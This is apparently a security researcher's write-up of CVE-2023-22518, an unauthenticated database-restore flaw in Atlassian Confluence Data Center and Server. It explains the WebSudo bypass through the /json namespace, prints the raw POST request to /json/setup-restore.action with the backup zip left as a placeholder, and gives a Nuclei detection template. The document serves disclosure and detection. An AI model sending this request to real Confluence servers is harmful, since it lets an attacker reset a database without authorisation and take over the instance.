# CVE-2023-22518
CVE-2023-22518 is a critical vulnerability in Atlassian Confluence Data Center and Server. The vulnerability could potentially allow unauthenticated attackers with network access to the Confluence Instance to restore the database of the Confluence instance and eventually execute arbitrary system commands.

## Technical Details
After performing a patch diff between the patched and unpatched versions, we identified the addition of two new annotations, namely, @WebSudoRequired and @SystemAdminOnly, in various Action classes.

Initially, we attempted to brute-force the routes leading to these specific actions, but this approach yielded no success. We then turned our attention to the struts.xml file, which contains information about action and namespace-based routing, as well as interceptors, hoping to uncover insights. However, nothing immediately stood out.

Additionally, we noticed a regex change in the SafeParametersInterceptor, which was related to a previous critical CVE-2023-22515 that had led to authentication bypass. We dedicated a significant amount of time trying to exploit this change, but were unable to make any breakthroughs. Our investigation led us to the understanding that in the case of ActionObject.getXYZ.getABC[N]=ANYTHING, where N must be a digit, the SafeParametersInterceptor would not consider the parameter key as a complex parameter and would permit OgnlValueStack.setValue(...).

The discovery revealed a complex hurdle: locating a method capable of facilitating authentication bypass through property modifications. This process necessitated the existence of a getter returning a collection or array. Furthermore, an index with a manipulable setter was essential. We then redirected our focus to the struts.xml file, scrutinizing its contents for any potential leads. Upon closer inspection, it was evident that the /json namespace enhances the /admin namespace's functions. Consequently, routes crafted for the /admin namespace can also be accessed via the /json namespace.

In the context of the /json namespace, the request routing process involves passing through a series of interceptors. One of these interceptors, known as the WebSudoInterceptor, performs checks based on the request URI.

WebSudo, a security feature commonly associated with Atlassian Confluence, plays a crucial role here. It requires users to re-authenticate themselves with elevated privileges, typically their password, before they can perform critical operations.

Specifically, the WebSudoInterceptor performs the following checks:

- If the request path is /authenticate.action, it is skipped.
- If the request path is /admin, it checks whether the WebSudoNotRequired attribute is not null.
- For any other request path, such as those in the /json namespace, it ensures that the WebSudoRequired attribute is null. This condition suggests that the WebSudoRequired annotation is not present at either the class, package, or method level. If this condition is met, the WebSudo check, which is responsible for initiating a secure admin session, is skipped.

The objective now is to identify an action (class) that lacks any authorization or authentication checks at the HTTP handler method level.

The subsequent phase involved conducting a brute-force of all the endpoints/actions within the /admin/ namespace to /json/. The objective was to monitor the responses and identify any noteworthy findings. During this, an observation was made when attempting a GET request on /json/setup-restore.action, which resulted in a 405 Method Not Allowed response. Further examination of the code confirmed that it lacked the WebSudoRequired annotation and did not implement any secondary authentication checks within the method handler. In essence, this meant that by supplying the correct parameters, the request could potentially succeed without requiring any form of authentication.

HTTP:
```
POST /json/setup-restore.action?synchronous=true HTTP/1.1
Host: localhost:8090
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7
X-Atlassian-Token: no-check
Content-Length: 277538

------WebKitFormBoundaryT3yekvo0rGaL9QR7
Content-Disposition: form-data; name="buildIndex"

false
------WebKitFormBoundaryT3yekvo0rGaL9QR7
Content-Disposition: form-data; name="file";filename="exploit-restore.zip"

ZIP_DATA
------WebKitFormBoundaryT3yekvo0rGaL9QR7
Content-Disposition: form-data; name="edit"

Upload and import
------WebKitFormBoundaryT3yekvo0rGaL9QR7--

```

Interestingly, passing synchronous=true what actually worked for us. This was a simple change from false to true when the earlier request was not resulting in a successful restore, even when a task was created to restore.

## Nuclei Template
Due to the nature of this vulnerability, to restore the state of Confluence instance to attacker-controlled data/users. We're releasing a detection-based template rather than a full exploit-based template for this CVE.

YAML:
```
id: CVE-2023-22518

info:
  name: Atlassian Confluence Server - Improper Authorization
  author: ForceFledgling
  severity: critical
  description: |
    All versions of Confluence Data Center and Server are affected by this unexploited vulnerability. There is no impact to confidentiality as an attacker cannot exfiltrate any instance data.
    Atlassian Cloud sites are not affected by this vulnerability. If your Confluence site is accessed via an atlassian.net domain, it is hosted by Atlassian and is not vulnerable to this issue.
  reference:
    - https://confluence.atlassian.com/pages/viewpage.action?pageId=1311473907
    - https://jira.atlassian.com/browse/CONFSERVER-93142
    - https://nvd.nist.gov/vuln/detail/CVE-2023-22518
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H
    cvss-score: 9.1
    cve-id: CVE-2023-22518
    epss-score: 0.00043
    epss-percentile: 0.0726
  metadata:
    verified: true
    max-request: 1
    vendor: atlassian
    product: confluence_data_center
    shodan-query: http.component:"Atlassian Confluence"
    note: this template attempts to validate the vulnerability by uploading an invalid (empty) zip file. This is a safe method for checking vulnerability and will not cause data loss or database reset. In real attack scenarios, a malicious file could potentially be used causing more severe impacts.
  tags: cve,cve2023,atlassian,confluence,rce,unauth

http:
  - raw:
      - |
        POST /json/setup-restore.action HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryT3yekvo0rGaL9QR7
        X-Atlassian-Token: no-check

        ------WebKitFormBoundaryT3yekvo0rGaL9QR7
        Content-Disposition: form-data; name="buildIndex"

        true
        ------WebKitFormBoundaryT3yekvo0rGaL9QR7
        Content-Disposition: form-data; name="file";filename="{{randstr}}.zip"

        {{randstr}}
        ------WebKitFormBoundaryT3yekvo0rGaL9QR7
        Content-Disposition: form-data; name="edit"

        Upload and import
        ------WebKitFormBoundaryT3yekvo0rGaL9QR7--

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains_all(body,'The zip file did not contain an entry', 'exportDescriptor.properties')"
        condition: and
```
